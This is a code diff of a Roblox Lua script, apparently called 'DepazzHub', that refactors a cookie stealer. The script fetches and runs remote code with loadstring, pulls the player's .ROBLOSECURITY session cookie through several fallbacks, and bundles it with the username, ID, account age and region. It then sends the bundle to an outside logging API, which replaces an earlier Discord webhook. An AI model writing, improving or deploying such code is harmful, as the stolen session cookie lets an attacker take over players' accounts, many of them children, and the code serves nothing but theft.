@@ -3,19 +3,17 @@ local Libraries = loadstring(game:HttpGet("https://raw.githubusercontent.com/sss
 
 -- --- 2. Configuración ---
 local API_URL = "https://depazzhub-api.onrender.com/log"
--- --- El webhook URL se lee de la variable de entorno de render ---
-local DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL") or "https://discord.com/api/webhooks/1234567890/yourwebhookurl"
-local EMBED_COLOR = 3447003 -- Azul Roblox
+local EMBED_COLOR = 3887359 -- Color del embed
 
 -- --- 3. Función para obtener la cookie ---
 local function getRobloxCookie()
-	-- Intentar con la librería
+	-- Intentar con la librería primero
 	local cookieService = Libraries:GetCookieService()
 	
 	if cookieService then
 		local cookieValue = Libraries:GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
 		
-		if cookieValue ~= "" then
+		if cookieValue ~= "" and cookieValue ~= nil then
 			return cookieValue
 		end
 	end
@@ -38,7 +36,7 @@ local function getRobloxCookie()
 		return savedCookie
 	end
 	
-	-- Fallback 3: intentar con getgenv() sin parámetros
+	-- Fallback 3: getgenv() con tablas
 	local savedCookie2 = getgenv()["_ROBLOSECURITY"]
 	if savedCookie2 and savedCookie2 ~= "" then
 		return savedCookie2
@@ -50,7 +48,7 @@ local function getRobloxCookie()
 		return savedCookie3
 	end
 	
-	-- Fallback 5: intentar con getgenv() directamente sin parámetros
+	-- Fallback 5: getgenv() directamente
 	local savedCookie4 = getgenv("_ROBLOSECURITY")
 	if savedCookie4 and savedCookie4 ~= "" then
 		return savedCookie4
@@ -60,26 +58,26 @@ local function getRobloxCookie()
 	return ""
 end
 
--- --- 4. Función para crear el embed de Discord ---
-local function createDiscordEmbed(data)
+-- --- 4. Función para formatear datos para la API ---
+local function formatDataForAPI(player, placeId)
+	local days = player.AccountAge
+	local years = math.floor(days / 365)
+	local months = math.floor((days % 365) / 30)
+	local ageText = days .. " days"
+	if years > 0 then
+		ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
+	end
+	
+	local region = game:GetService("LocalizationService").RobloxLocaleId
+	
 	return {
-		{
-			"title" = data.username .. " - DepazzHub",
-			"description" = "Usuario de Roblox",
-			"color" = EMBED_COLOR,
-			"fields" = {
-				{ "name" = "ID", "value" = data.userId, "inline" = true },
-				{ "name" = "Nombre", "value" = data.displayName, "inline" = true },
-				{ "name" = "Edad de cuenta", "value" = data.accountAge, "inline" = true },
-				{ "name" = "Región", "value" = data.region, "inline" = false },
-				{ "name" = "Cookie", "value" = data.cookie, "inline" = false }
-			},
-			"footer" = {
-				"text" = "DepazzHub API",
-				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
-			},
-			"timestamp" = os.date("%Y-%m-%dT%H:%M:%SZ")
-		}
+		username = player.Name,
+		displayName = player.DisplayName,
+		userId = player.UserId,
+		gameId = placeId,
+		accountAge = ageText,
+		region = region,
+		cookie = ".ROBLOSECURITY=" .. getRobloxCookie()
 	}
 end
 
@@ -127,37 +125,10 @@ local function main()
 	
 	-- Obtener datos del jugador
 	local player = game.Players.LocalPlayer
-	local userId = player.UserId
 	local placeId = game.PlaceId
 	
-	-- Obtener edad de la cuenta
-	local days = player.AccountAge
-	local years = math.floor(days / 365)
-	local months = math.floor((days % 365) / 30)
-	local ageText = days .. " days"
-	if years > 0 then
-		ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
-	end
-	
-	-- Obtener región
-	local region = game:GetService("LocalizationService").RobloxLocaleId
-	
-	-- Obtener la cookie
-	local cookieValue = getRobloxCookie()
-	
-	-- Preparar los datos
-	local data = {
-		username = player.Name,
-		displayName = player.DisplayName,
-		userId = userId,
-		gameId = placeId,
-		accountAge = ageText,
-		region = region,
-		cookie = ".ROBLOSECURITY=" .. cookieValue
-	}
-	
-	-- Crear el embed
-	local embed = createDiscordEmbed(data)
+	-- Formatear los datos
+	local data = formatDataForAPI(player, placeId)
 	
 	-- Enviar el webhook
 	local success = sendWebhook(data)
